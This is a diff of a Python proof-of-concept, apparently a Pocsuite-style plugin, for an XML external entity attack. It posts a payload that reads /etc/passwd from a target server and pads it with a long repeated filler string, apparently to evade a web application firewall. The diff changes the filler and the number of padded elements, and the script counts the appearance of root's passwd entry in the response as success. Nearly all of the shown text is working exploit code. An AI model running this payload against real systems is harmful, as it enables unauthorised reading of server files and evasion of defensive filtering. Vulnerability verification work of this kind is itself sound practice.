@@ -31,16 +31,14 @@ class TestPOC(POCBase):
             <!ELEMENT name ANY >
             <!ENTITY xxe SYSTEM "file:///etc/passwd" >
             ]><root>
-            <name>&xxe;'''+"bypass_lageflow"*50000+'''</name>
-            <name>&xxe;'''+"bypass_lageflow"*50000+'''</name>
-            <name>&xxe;'''+"bypass_lageflow"*50000+'''</name>
-            <name>&xxe;'''+"bypass_lageflow"*50000+'''</name>
-            <name>&xxe;'''+"bypass_lageflow"*50000+'''</name>
-            <name>&xxe;'''+"bypass_lageflow"*50000+'''</name>
+            <name>&xxe;'''+"010202030302"*50000+'''</name>
+            <name>&xxe;'''+"010202030302"*50000+'''</name>
+            <name>&xxe;'''+"010202030302"*50000+'''</name>
+            <name>&xxe;'''+"010202030302"*50000+'''</name>
             </root>'''
         resp = req.post(target,data=http_body)
         if "x:0:0:root" in resp.text:
-            print(resp.text.replace("bypass_lageflow",""))
+            print(resp.text.replace("010202030302",""))
             result['VerifyInfo'] = "success"
         return self.parse_output(result)
     _attack = _verify
